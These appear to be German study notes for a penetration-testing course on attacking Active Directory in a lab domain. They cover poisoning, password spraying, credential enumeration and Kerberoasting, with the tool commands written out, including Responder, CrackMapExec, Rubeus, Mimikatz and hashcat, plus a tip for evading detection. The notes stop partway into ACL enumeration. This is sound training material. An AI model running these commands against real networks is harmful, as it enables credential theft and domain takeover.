@@ -1,0 +1,1301 @@
+Active Directory Enumeration & Attacks
+Setting the Stage:
+1. Introduction to Active Directory Enumeration & Attacks:
+- Active Directory Explained:
+	- Active Direcotry ist ein Verzeichnis Service fuer Windows in Unternehmen
+	- AD basiert auf Protokollen wie x.500 und LDAP
+	- Es ist eine verteilte, hierachische Struktur die eine zentrale Verwaltung von Orgranisationen Ressourcen wie User, Computer, Gruppen, Netzwerkgeraete
+	- AD bietet Authentifizierung, Abrechnung und Autorisierung Funktionen fuer Windows
+
+- Why Should We Care About AD?:
+	- AD wird sehr oft von Unternehmen verwendet mit 43% ist es der groesste Leosung fuer Identity and Access management
+
+2. Tools Of The Trade:
+- Siehe HTB Academy
+
+3. Sceneario:
+- In Scope For Assessment:
+	- INLANEFREIGHT.LOCAL	Customer domain to include AD and web services.
+	- LOGISTICS.INLANEFREIGHT.LOCAL	Customer subdomain
+	- FREIGHTLOGISTICS.LOCAL	Subsidiary company owned by Inlanefreight. External forest trust with -INLANEFREIGHT.LOCAL
+	- 172.16.5.0/23	In-scope internal subnet.
+
+- Methods Used:
+	- External Information Gathering(Passive Checks)
+	- Internal Testing
+	- Password Testing
+
+###################################################################################################
+Initial Enumeration
+1. External Recon and Enumeration Principles:
+- Bevor wir ein Pentest durchfuehren sollten wir externe Erkundung durchfuehren
+- Wir koennen die Informationen die wir vom Clienten valdieiren
+- Wir gucken nach Github Repositories fuer Credentials, Code usw
+- Wir koennen nach Unternehmens Dokumenten, Links usw suchen
+
+- What Are We Looking For?:
+	- Wir koennen Informationen koennen wir folgendes raussuchen:
+		- IP Spaces: DNS Eintraege, Oeffentliche Infrasturktur
+		- Domain Information: Informationen wer die Domaine hostet oder Informationen ueber die Domaine
+		- Schema Format: Email Accounts, AD Usernamen, Passwort Richtlinien
+		- Data Disclosures: Dateien die in einer Suchmaschine/Intranet zu finden sind
+		- Breach Data: Usernamen, usw oder andere kritische Informationen aus Veroeffentlichen
+
+- Where Are We Looking?:
+	- Es gibt verschiedene Webseiten die wir verwenden um Informationen ueber Firmen zu erlangen
+	- ASN/IP Registrars: IANA, RIPE fuer die Europaer, BGP Toolkit
+
+2. Initial Enumeration of the Domain:
+- Schluesseldaten Punkte:
+	- AD Users
+	- AD Computer: Domain Controller, Dateiserver, SQL Server, Web Server, Email Server
+	- Key Services: Kerberos, NetBIOS, LDAP, DNS
+	- Host und Services mit Schwachstelllen
+
+- Hosts in AD identifizieren:
+	- Passive Checks:
+		- Mit Wireshark oder TCPDump koennen wir den Traffic abgreifen
+		- Wenn wir einen Host ohne GUI haben koennen wir tcpdump(https://linux.die.net/man/8/tcpdump), NetMiner(http://www.netminer.com/main/main-read.do), net-creds(https://github.com/DanMcInerney/net-creds) verwenden
+		- Wir koennen ausserdem Responder(https://github.com/lgandx/Responder-Windows) verwenden um den Traffic zu analysieren mit der Option -A
+			- sudo responder -I <Interface_Name> -A
+
+	- Active Scans:
+		- Fping(https://fping.org/) sendet ICMP Pakete an jeden Host in einem Netzwerkadressenbereich
+		- Mit der Option:
+			- a: Targets zeigen die aktiv sind
+			- s: Zeigt Statistiken am Ende des Scans aus
+			- g: Generiert eine Ziellister aus dem CIDR Netzwerk
+			- q: Zeigt alle Ausgaben am Ende
+		- fping -asgq <Netzwerkadresse/Praefix>
+
+- Nmap Scan:
+	- Hiermit koennen wir den Domain Controller finden
+		- sudo nmap -v -A -iL hosts.txt
+	- Den Domain Controller scannen
+		- nmap -A <Domain_Controller_IP>
+
+- User Identifizieren:
+	- Wenn wir keinen User bekommen haben muessen wir einen Weg in die Domainen finden und Credentials zu bekommen
+	- Kerbrute(https://github.com/ropnop/kerbrute):
+		- Kerbrute kann eine Domain Account Enumeration durchfuehren
+		- sudo git clone clone https://github.com/ropnop/kerbrute.git
+		- sudo make all
+		- kerbrute userenum -d <Domaine> --dc <IP> <User.txt> -o valid_ad_users
+
+- Wege um an SYSTEM Privilegien zu gelangen:
+	- Remote Windows exploits such as MS08-067, EternalBlue, or BlueKeep.
+	- Abusing a service running in the context of the SYSTEM account, or abusing the service account SeImpersonate privileges using Juicy Potato. This type of attack is possible on older Windows OS' but not always possible with Windows Server 2019.
+	- Local privilege escalation flaws in Windows operating systems such as the Windows 10 Task Scheduler 0-day.
+	- Gaining admin access on a domain-joined host with a local account and using Psexec to launch a SYSTEM cmd window
+
+###################################################################################################
+Sniffing out a Foothold
+1. LLMNR/NBT-NS Poisoning - from Linux:
+- In diesem Schritt haben wir Informationen ueber User und Gruppen und Namensgebungsrichtlinien
+- Jetzt werden wir versuchen an Credentials fuer User zu bekommen diese koennen wir mittels 2 Techniken machen:
+	- Man-in-the-Middle Attack on Link-Local Multicats Name Resolution(LLMRNR)
+	- NetBIOS Name Service(NBT-NS)
+
+- LLMNR & NBT-NS Primer:
+	- LLMNR und NBT-NS sind Microsoft Komponenten die alternative Methoden sind um Host zu identifizieren wenn der DNS nicht erreichbar ist
+	- Der Host verwendet LLMNR um alle anderen Hosts im lokalen Netzwerk nach der richtigen IP-Adresse zu fragen
+	- LLMNR basiert auf DNS Format und fuehrt Name Resolution aus
+	- LLMNR laeuft auf UDP Port 5355
+	- Wenn LLMNR verschlaegt verwenden wir NBT-NS hier identifizieren wir Hosts an ihrem NetBIOS Namen
+	- NBT-NS laeuft auf UDP Port 137
+	- Mit Responder koennen wir die Anfragen von LLMNR/NBT-NS vergiften, dass die Hosts mit uns kommunizieren dadurch koennen wir einen NETNTLM Hash abfangen
+
+- TTPs:
+	- Wir sammelen Informationen ueber das Netzwerk in Form von NTLMv1 und NTLMv2 Hashes die fuer die Authentifizierungs Protokolle verwendet werden
+	- Die Hashes koennen wir mit Hashcat oder John knacken
+	- Tools fuer LLMNR & NBT-NS vergiften:
+		- Responder(https://github.com/lgandx/Responder)
+		- Inveigh(https://github.com/Kevin-Robertson/Inveigh)
+		- Metasploit(https://www.metasploit.com/)
+
+- Responder in Action:
+	- sudo responder -I <Interface_Namen>
+
+2. LLMNR/NBT-NS Poisoning - from Windows:
+- LLMNR/NBT-NS Poisoning ist auch auf Windows moeglich mit dem Tool Inveigh
+- Inveigh(https://github.com/Kevin-Robertson/Inveigh) arbeitet aehnlich wir Responder
+
+- Using Inveigh(https://github.com/Kevin-Robertson/Inveigh) in PowerShell:
+	- Import-Module .\Inveigh.ps1
+	- (Get-Command Invoke-Inveigh).Parameters
+	- Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
+	- Die C# Version von Inveigh wird noch geupdatet und wird mit .\Inveigh.exe gestartet
+
+###################################################################################################
+Sighting In, Hunting For A User
+1. Password Spraying Overview:
+- Mit einer Usernamen und Passwort Liste koennen wir Logins testen dieser Prozess wird Password Spraying genannt
+- Hierbei sollten wir auspassen, dass die User nicht gesperrt werden
+
+2. Enumerating & Retrieving Password Policies:
+- Enumerating the Password Policy - from Linux - Credentialed:
+	- Wenn wir Credentials haben koennen wir CrackMapExec oder rpcclient verwneden um an die Password Richtlinien zu gelangen
+	- crackmapexec smb <IP> -u <User> -p <Password> --pass-pol
+
+- Enumerating the Password Policy - from Linux - SMB NULL Sessions:
+	- Wenn wir keine Credentials haben koennen wir immernoch versuchen uns bei SMB mit einer Null Session vorzuarbeiten
+	- rpcclient -U "" -N <IP>
+	- smbclient -N -L //<IP>
+	- Mit querydominfo koennen wir Informationen zur Domaine erlangen
+	- Mit getdompwinfo koennen wir Informationen ueber die Passwort Richtlinien gelangen
+
+- Using enum4linux:
+	- Mit enum4linux(https://labs.portcullis.co.uk/tools/enum4linux) koennen wir an Password Richtlinien und andere Informationen ueber die Domaine ausgeben
+	- enum4linux -P <IP>
+	- enum4linux-ng(https://github.com/cddmp/enum4linux-ng) ist enum4linux in Python mit weiteren Features
+	- enum4linux-ng -P <IP> -oA ilfreight
+
+- Enumerating Null Session - from Windows:
+	- Von Windows aus koennen wir auch eine Angriff mit einer Null Session ausfuehren
+	- net use \\<IP>\ipc$ "" /u:""
+	- net use \\<IP>\ipc$ "password" /u:guest
+
+- Enumerating the Password Policy - from Linux - LDAP Anonymous Bind:
+	- LDAP anonymous binds(https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/anonymous-ldap-operations-active-directory-disabled) erlaubt Informationen von der Domaine zu bekommen
+	- Mit ldapsearch(https://linux.die.net/man/1/ldapsearch) koennen wir ebenso die Password Richtlinien anzeigen lassen
+	- ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+
+- Enumerating the Password Policy - from Windows:
+	- Mit net.exe koennen wir uns ebsno die Password Richtlinien anzeigen lassen
+	- Wir koennen ebenso Tools wir PowerView, SharpMapExec oder SharpView verwenden
+	- PowerView verwenden:
+		- import-module .\PowerView.ps1
+		- Get-DomainPolicy
+
+3. Password Spraying - Making a Target User List:
+- Um einen Spraying Angriff durchzufuehren benoetigen wir eine User Liste
+- Dies kann auf unterschiedliche Art und Weise erfolgen:
+	- Mit SMB Null Sessiosn Domaine User Liste ausgeben
+	- LDAP anonymous bind um User Liste zu bekommen
+	- Mit Kerbrute und einer Usernamenliste nachpruefen welche Usernamen verfuegbar sind
+	- Generiert eine Username Listen von LinkedIn(https://github.com/initstring/linkedin2username)
+	- Mit Responder eine LLMNT/NBT-NS Vergiftung durchfuehren
+
+- SMB NULL Session to Pull User List:
+	- enum4linux -U <IP>  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+	- rpcclient -U "" -N <IP>
+	- crackmapexec smb <IP> --users
+
+- Gathering Users with LDAP Anonymous:
+	- ldapsearch -H <IP> -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+	- ./windapsearch.py --dc-ip <IP> -u "" -U
+
+- Enumerating Users with Kerbrute:
+	- kerbrute userenum -d inlanefreight.local --dc <IP> </opt/jsmith.txt or other Username List>
+
+- Credentialed Enumeration to Build our User List:
+	- sudo crackmapexec smb <IP> -u <User> -p <Password> --users
+
+###################################################################################################
+Spray Responsibly
+1. Internal Password Spraying - from Linux:
+- Jetzt haben wir Passwortlisten fuer Usernamen und Passwoerter
+- Internal Password Spraying from a Linux Host:
+	- Attack:
+		- for u in $(cat <valid_users.txt>);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <IP> | grep Authority; done
+		- kerbrute passwordspray -d <Domain> --dc <IP> <valid_users.txt>  Welcome1
+	
+	- Using CrackMapExec & Filtering Logon Failures:
+		- sudo crackmapexec smb <IP> -u <valid_users.txt> -p <Password> | grep +
+	- Validating the Credentials with CrackMapExec:
+		- sudo crackmapexec smb <IP> -u <User> -p <Password>
+
+	- Local Admin Spraying with CrackMapExec:
+		- Wenn wir Hashes von einem Admin haben koennen wir dies ebenso verwenden
+		- sudo crackmapexec smb --local-auth <IP>/<Praefix> -u <User> -H <Hashes> | grep +
+
+2. Internal Password Spraying - from Windows:
+- Auf einem Windows Host koennen wir das DomainPasswordSpray(https://github.com/dafthack/DomainPasswordSpray) Tool verwenden
+- Powershell using DomainPasswordSpray.ps1:
+	- Import-Module .\DomainPasswordSpray.ps1
+	- Invoke-DomainPasswordSpray -Password <Password> -OutFile <Output_File> -ErrorAction SilentlyContinue
+
+###################################################################################################
+Deeper Down the Rabbit Hole
+1. Enumerating Security Controls:
+- Wenn wir Zugang haben koennen wir das System einmal enumerieren um Sicherheitsmassnahmen usw auszumachen
+- Windows Defender:
+	- Windows Defender wird Tools wie PowerView blockieren
+	- Mit Get-MpComputerStatus kann der Defender Status ausgegeben werden
+
+- AppLocker:
+	- AppLocker ist Microsofts Variante Anwendung zu Whitelisten 
+	- Hiermit koennen DLLs, Scripts, Executable usw ausgefuehrt werden
+	- Viele Firmen blockieren auch PowerShell Anwendungen
+	- Mit "Using Get-AppLockerPolicy cmdlet" kann die Richtlinien fuer AppLocker ausgegeben werden
+
+- PowerShell Constrained Language Mode:
+	- PowerShell Contrained Language Modus schliesst manche Features die PowerShell effektiv machen wie das blockieren von COM Objekten, 
+	- Mit "$ExecutionContext.SessionState.LanguageMode" koennen wir pruefen ob dies der Fall ist
+
+- Local Admnistrator Password Solution(LAPS)(https://www.microsoft.com/en-us/download/details.aspx?id=46899):
+	- PowerShell Tool LAPSToolkit(https://github.com/leoloobeek/LAPSToolkit)
+	- Bietet einen lokalem Administrator eine Moeglichkeit Passwoerter zufaellig auszuwaehlen
+	- Wir koennen enumerieren um zu sehen welche User LAPS Passwoerter zu lesen
+		- Find-LAPSDelegatedGroups: Zeigt Gruppen die Rechte haben um LAPS Passwoerter zu lesen
+		- Find-AdmPwdExtendedRights: Zeigt an welche Computer LAPS erlauben und Passwoerter lesen koennen
+		- Get-LAPSComputers: Sucht nach Computern mit LAPS erlaubt und wenn Passwoerter verfallen sie im Klartext anzeigen
+
+2. Credentialed Enumeration - from Linux:
+- Wenn wir Zugriff zu einer Domaine haben koennen wir weiter enumerieren
+- Wir wollen andere Credentials ueber andere User bekommen
+
+- CrackMapExec:
+	- CrackMapExec ist ein wichtige Tool um AD Domaine zu enumerieren
+	- crackmapexec smb <IP> <Optionen>
+	- Optionen:
+		- -u <Usernamen>: Usernamen
+		- -p <Password>: Password
+		- --users: Enumeriert Domain User
+		- --groups: Enumeriert Domain Gruppen
+		- --loggedon-users: Versucht eingeloggte User zu finden
+		- --shares: Enumeriert die verfuebaren Shares fuer einen remote Host
+		- --spider_plus: Durchsucht alle lesbaren Shares und listet lesbare Dateien auf
+
+- SMBMap:
+	- Mit SMBMap koennen wir SMB Shares enumerieren
+	- Wir koennen den Zugang zu SMB ueberpruefen:
+		- smbmap -u <Usernamen> -p <Password> -d <Domain> -H <IP>
+	- Listet alle Verzeichnisse auf:
+		- smbmap -u <Usernamen> -p <Password> -d <Domain> -H <IP> -R '<Share_Name>' --dir-only
+
+- rpcclient:
+	- rpcclient ist ein Tool um Objekte zu enumerieren, hizuzufuegen, zu entfernen oder zu aendern
+	- Wir koennen eine SMB Null Session starten
+		- rpcclient -U "" -N <IP>
+	- In rpcclient koennen wir eine Enumeration durchfuehren:
+		- Mit Relative Identifier(RID)(https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/security-identifiers) werden Objekte identifiziert
+		- Gibt Informationen ueber einen User aus mittels einer RID
+			- queryuser <RID>
+		- Enumeriert ueber alle User hinweg
+			- enumdomusers
+
+- Impacket Toolkit:
+	- Impacket ist ein Toolpaket um ein eine Domain zu enumerieren
+	
+	- psexec.py(https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py):
+		- Mit psexec koennen wir eine Shell auf dem Victim Host erlangen, indem eine executable auf den ADMIN$ Share erstellt wird und eine Pipe an den Attack Host erstellt wird
+		- psexec.py <Domain>/<User>:'<Password>'@<IP>
+	
+	- wmiexec.py(https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py):
+		- Befehle werden durch Windows Management Instrumentation(https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) ausgefuehrt um damit eine semi-interaktive Shell auszufuehren
+		- Es kopiert keine Daten und generiert weniger Log Daten und ist deswegen die unaufaelliger Variante
+		- Es wird pro Befehlseingabe eine neue CMD.exe ausgefuehrt was aufaellig sein kann
+		- wmiexec.py <Domain>/<User>:'<Password>'@<IP>  
+
+- Windapsearch(https://github.com/ropnop/windapsearch):
+	- Windapsearch ist ein weiteres Tool um User,Gruppen, Computer usw in einer Windows Domaine zu enumerieren mittelt LDAP queries
+	- python3 windapsearch.py --dc-ip <IP> -u <User>@<Domain> -p <Password> <Optionen>
+	- Optionen:
+		- --da: Enumeriert Domain Admin Group Members
+		- -PU: Findet privilged User
+
+- Bloodhound.py(https://github.com/fox-it/BloodHound.py):
+	- Wenn wir Domainen Credentials haben koennen wir mit BloodHound und Informationen aus der Domaina herauszubekommen
+	- sudo bloodhound-python -u '<User>' -p '<Password>' -ns <IP> -d <Domain> <Optionen>
+	- Optionen:
+		- -c oder --collectionmethod: Ist ein Flag mit dem wir festlegen was gesammelt werden soll
+
+	- Resultatet angucken:
+		- Mittels der BloodHound GUI koennen wir die Ergbenisse graphisch anzeigen lassen
+		- Hierfuer imporitieren wir die Ausgabedateien von bloodhound in die GUI
+
+3. Credentialed Enumeration - from Windows:
+- Jetzt kommen wir zu Enumerierung mit validen Credentials von Windows Host aus
+- ActiveDirectory PowerShell Module:
+	- ActiveDirectory PowerShell Module sind eine Gruppe von PowerShell cmdlets fuer die Verwaltung von Active Directory
+	- Bevor wir diese Module verwenden muessen wir sicherstellen, dass die Module importiert sind
+	- Get-Module listen alle verfuegbaren Module auf
+	- Wenn ein Module nicht geladen ist kann es mit <Import-Module <Modulnamen>> importiert werden
+	- In unserem Fall <Import-Module ActiveDirectory>
+		- Get-ADDomain(https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addomain?view=windowsserver2022-ps):
+			- Get-ADDomain gibt uns grundlegende Informationen ueber die Domaine
+		- Get-ADUser(https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-aduser?view=windowsserver2022-ps):
+			- Gibt uns alle User in der Domain aus
+			- Die Ausgabe koennen wir nach ServicePricipalName filtern um User die angegriffen werden koennen nachzusuchen
+			- Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+		- Get-ADTrust(https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=windowsserver2022-ps):
+		- Get-ADTrust(https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adtrust?view=windowsserver2022-ps):
+			- Gibt alle Vetrauensbeziehungen der Domaine aus
+		- Get-ADGroup(https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps):
+			- Mit Get-ADGroup koennen wir alle AD Gruppen ausgeben
+			- Nach Namen Filtern:
+				- Get-ADGroup -Filter * | select name
+			- Informationen ueber eine besimmte Gruppe ausgeben:
+				- Get-ADGroup -Identity "<Gruppen_Name"
+		- Get-ADGroupMember:
+			- Mit Get-ADGroupMember(https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroupmember?view=windowsserver2022-ps):
+				- Get-ADGroupMember -Identity "<Gruppen_Name>"
+				- Listet Mitglieder einer Gruppe auf
+
+- PowerView(https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon):
+	- PowerView ist ein in PowerShell geschriebenes Tool mit dem Informationen ueber das AD Umfeld bekommen werden kann
+	- Wir koennen User, Gruppen, Computer, ACLS, Shares usw identifizieren
+	- PowerView hat viele Funktionen wie:
+		- Get-DomainUser:
+			- Get-DomainUser -Identity <User> -Domain <Domain>
+			- Gibt Informationen ueber alle User oder spezifische User aus
+		- Get-DomainGroupMember:
+			- Get-DomainGroupMember -Identity "<Gruppenname>" -Recurse
+			- Gibt alle Gruppenmitglieder aus einer Gruppe aus
+		- Get-DomainTrustMapping:
+			- Mit Get-DomainTrustMapping koennen wir die Vertauensbeziehungen aus
+		- Test-AdminAccess -ComputerName <Computernamen>
+			- Mit Test-AdminAccess koennen wir den Zugang mittelt local admin verifizieren
+		- Finding Users With SPN Set:
+			- Mit einem Service Principal Name(SPN) Attribut kann der User anfaellig fuer ein Kerberoasting Angriff sein
+			- Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
+
+- SharpView:
+	- SharpView ist ein gutes Tool um AD Netzwerke zu enumerieren
+	- PowerView ist immernoch ein Tool mit neueren Funktionen
+
+- Snaffler(https://github.com/SnaffCon/Snaffler):
+	- Snaffler ist ein Tool um an Credentials oder andere sensible Daten zu erlangen
+	- Es ueberprueft mit allen Hosts in einem Netzwerk die Shares nach lesbaren Verzeichnissen
+	- Snaffler.exe -s -d <Domain> -o <Domain_File> -v data
+
+- BloodHound:
+	- Bloodhound kann Angriffspfade in einer AD Umgebung erkennen
+	- .\SharpHound.exe -c All --zipfilename <Zip_Name>
+	- Sammelt alle Daten un speichert diese als ILFREIGHT.ZIP
+
+4. Living Off the Land
+- Hier werden wir Windows eigene Tools verwenden um die AD Umgebung zu enumerieren
+
+- Env Commands For Host & Network Recon:
+	- Basic Enumeration Commands:
+		- Der Befehl systeminfo gibt die Informationen von allen untenstehenden Befehle auf einmal aus
+		- hostname: Gibt den Hostnamen des PCs aus
+		- [System.Environment]::OSVersion.Version: Gibt die OS Version und Revision level aus
+		- wmic qfe get Caption,Description,HotFixID,InstalledOn: Gibt Patches und Hotfixes auf dem Host aus
+		- ipconfig /all: Gibt Netzwerk Konfiguration aus
+		- set %USERDOMAIN%: Gibt den Domain Namen aus
+		- set %logonserver%: Gibt den Namen des Domain Controller aus
+
+- Harnessing PowerShell:
+	- In PowerShell gibt es noch mehr Befehle die uns weiterhelfen koennen
+	- Get-Module: Listet alle Module auf
+	- Get-host: Gibt alle Informationen ueber den Host aus
+
+- Firewall Chesk:
+	- netsh advfirewall show allprofiles: Gibt den Status der Firewall aus
+	- Get-MpComputerStatus: GIbt die Einstellungen des Microsoft Defender aus
+
+- Check if your alone:
+	- Check who is logged in
+	- qwinsta
+
+- Network Information:
+	- arp -a: Gibt die ARP Routing Tabelle aus
+	- route print: Listet alle Routing Tabellen aus
+	- ipconfig /all: Gibt alle Adapter Einstellungen aus
+
+- Windows Management Instrumentation(WMI) (https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi):
+	- WMI ist eine Scripting Engine die fuer Verwaltungszwecke in Windows Netzwerke verwendet wird
+	- Dokumentation(https://docs.microsoft.com/en-us/windows/win32/wmisdk/using-wmi)
+	- Commands:
+		- wmic qfe get Caption,Description,HotFixID,InstalledOn: 
+		- wmic process list /format:list: Gibt alle Prozesse auf dem Host aus
+
+- Net Commands(https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2):
+	- Wir koennen Informationen ueber User, Gruppen, Hosts, Domain Controller usw auflisten
+	- net group /domain: Listet alle Domaingruppen auf
+	- net user /domain <Usernamen>: Listet Informationen uber den User in der Domaina auf
+	- Um nicht erwischt zu werden kann net1 vor dem Befehl geschrieben werden diese Befehle werden nicht oft ueberprueft als Beispiel:
+		- net1 user
+
+- Dsquery(https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)):
+	- Dsquery ist ein Tool um Active Directory Objekte zu finden
+	- Dsquery existiert auf jedem PC mit Active Directory Domain Services Role installiert
+	- Speicherort ist: C:\Windows\System32\dsquery.dll
+	- Um dsquery zu verwenden muessen wir erhoehte Rechte haben
+	- dsquery user: Listet alle User mit Attributen auf
+	- dsquery computer: Listet alle Computer in der Domaine auf
+	- dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL": Listet Objekte mit ensprechendnen Attributen auf
+	- Searching for Domain Controllers:
+		- dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
+
+- LDAP Filtering:
+	- Der LDAP String "userAccountControl:1.2.840.113556.1.4.803:" gibt das User Account Control(UAC)(https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) Attribut fuer ein Objekt an
+
+###################################################################################################
+Cooking with Fire:
+1. Kerberoasting - from Linux:
+- Jetzt muessen wir nach Wegen wie wir zusaetzliche Privilegien bekommen koennen oder wie wir uns durch das Netzwerk bewegen koennen
+- Kerbroasting Overview:
+	- Kerberoasting ist eine Technik um mehr Priviliegien zu bekommen und uns durch das Netzwerk zu bewegen
+	- Hier werden Service Principal Names (SPN)(https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) Accounts angegriffen
+	- SPN Accounts werden verwendet damit Kerberos Service Instanz zu einem Service Account verknuepft werden koennen
+	- Kerbroasting fordert einen Kerberos-Service-Ticket(TGS) von einem Dienst an um den Passworthash abzugreifen
+	- Hierufer benoetigen wir einen Domain User dann muessen wir fuer ein anderen Account eine TGS anfordern mit Tools wie GetUserSPNs
+	- Mit Mimikatz koennen wir den Passworthash aus dem Ticket zu decodieren
+
+- Performing the Attack:
+	- Install Impacket:
+		- sudo python3 -m pip install .
+	- SPN Accounts auflisten:
+		- GetUserSPNs.py -dc-ip <IP> <Domain>/<User>
+	- Alle TGS Ticket anfordern:
+		- GetUserSPNs.py -dc-ip <IP> <Domain>/<User> -request
+	- Ein TGS Ticket anfordern und in Datei speichern:
+		- GetUserSPNs.py -dc-ip <IP> <Domain>/<User> -request-user <Request_Usernamen> -outputfile sqldev_tgs
+	- Ticket mit hashcat cracken:
+		- hashcat -m 13100 <TGS_Ticket> <Wordlist>
+		- john <TGS_Ticket> --format=krb5tgs --wordlist=<Wordlist>
+
+2. Kerberoasting - from Windows:
+- Kerberos Manual Method:
+	- Mit dem Tool Rubeus koennen Tools gestolen oder gefaelscht werden
+
+- Manueller Weg:
+	- Enumerating SPNs:
+		- setspn: Enumerieren von SPN Accounts in der Domaine
+			- CMD: setspn.exe -Q */*
+			- PowerShell setspn -Q */*
+	- Targeting a Single User:
+		- Add-Type -AssemblyName System.IdentityModel : Fuegt cmdlet hinzu  System.IdentityModel hinzu
+		- New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433" : Erstellt einen neuen Security Token
+	- Retrieving All Tickets:
+		- setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
+	- Extracting Tickets from Memory with Mimikatz:
+		- mimikatz # base64 /out:true
+		- kerberos::list /export
+	- Preparing the Base64 Blob for Cracking:
+		- echo "<base64 blob>" |  tr -d \\n 
+	- Placing the Output into a File as .kirbi:
+		- cat encoded_file | base64 -d > sqldev.kirbi
+	- Extracting Kerberos Ticket: 
+		- python2.7 kirbi2john.py sqldev.kirbi
+	- Modifiying crack_file for Hashcat:
+		- sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+	- Cracking the Hash with Hashcat:
+		- hashcat -m 13100 <Hash> <Wordlist>
+
+- Automated / Tool Based Route:
+	- Wir koenenn Tools wie PowerView(https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) verwenden 
+	- Using PowerView to Extract TGS Ticket:
+		- Import-Module .\PowerView.ps1
+		- Get-DomainUser * -spn | select samaccountname
+	- Using PowerView to Target a Specific User:
+		- Get-DomainUser -Identity <User> | Get-DomainSPNTicket -Format Hashcat
+	- Exporting All Tickets to a CSV File:
+		- Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+	- Wir koennen auch Rubeus(https://github.com/GhostPack/Rubeus) verwenden:
+		- .\Rubeus.exe kerberoast /stats
+		- Get TGS Ticket:
+			- Fragt Ticket fuer Admins an mit /nowrap
+				- /nowrap Flag bereitet Hash fuers Cracken vor
+				- .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+			- Fragt nach einem Ticket fuer einen spezifischen User
+				- .\Rubeus.exe kerberoast /user:<User> /nowrap
+	- Cracking Hash:
+		- hashcat -m 13100 <Hash> <Wordlist>
+		- john <TGS_Ticket> --format=krb5tgs --wordlist=<Wordlist>
+
+###################################################################################################
+An ACE in the Hole:
+1. Access Control List(ACL) Abuse Primer:
+- Die Rechte/Zugriffsrtechte werden von einer Access Control List(ACLs) kontrolliert
+- Access Control List(ACL):
+	- Eine ACL besteht aus Access Control Entities(ACEs) diese kontrollieren Zugriffsrechte auf Ressourcen
+	- Eine ACE vergibt Rechte an User, Gruppen, Prozesse usw
+	- Es gibt zwei Arten von ACLs:
+		- Discretionary Access Control List(DACL):
+			- Definiert die Zugriffsrechte fuer Objekte
+			- DACL bestehen aus ACEs und erlauben oder verbieten Zugriff
+			- Wenn ein DACL wenn ein Objekte nicht existiert bekommen alle User volle Rechte auf das Objekt
+			- Wenn ein DACL existiert ohne ACE Eintraege werden allen User das Rechte auf das Objekt verboten
+		- System Access Control Lists (SACL):
+			- Erlaubt dem Admin das Loggen von Zugriffsversuchen von sicheren Objekten
+
+- Access Control Entities(ACEs):
+	- ACLs bestehen aus ACEs die einem User oder einer Gruppe Zugriffsrechte geben
+	- Es gibt 3 Typen von ACEs:
+		- Access Denied ACE: Verwendet in DACL. User oder Gruppe wird Zugriff zu einem Objekt verboten
+		- Access Allowed ACE: Verwendet in DACL. User oder Gruppen wird Zugriff zu einem Objekt gewaehrt
+		- System audit ACE: Verwendet in SACL. Zeichnet Zugriffsversuche zu sicheren Objekten auf
+	- Ein ACE besteht aus 4 Komponenten:
+		1. Security Identifier(SID) von einem User oder Gruppe
+		2. Ein Flag um den Typ von ACE zu definieren
+		3. Ein Flag ob die Kinder Objekte die Rechte auch bekommen
+		4. Eine Zugriffsmaske(https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/7a53f60e-e730-4dfe-bbe9-b21b  2eb790b?redirectedfrom=MSDN) definiert in einer 32 Bit Maske die Rechte fuer ein Objekt
+	- ACE koennen in Active Directory Users and Computer(ADUC) festgelegt werden
+	- Schwachstellen in ACE koennen nicht durch Schwachstellenscanner festgestellt werden
+	- Mit BloodHound koennen AD Objekte enumeriert werden
+	- Mit PowerView koennen diese Schwachstellen ausgenutzt werden
+
+- ACL Attacks in the Wild:
+	- Wir koennen ACL Angriffe fuer Lateral Movement, Privilege Escalation, Peristence verwenden
+
+2. ACL Enumeration:
+- Mit PowerView koennen wir die ACLs enumerieren und diese mit BloodHound grafich anzeigen lassen
+- Enumerating ACLs with PowerView:
+	- Alle ACLs zu durchsuchen ist extrem Zeitintensiv
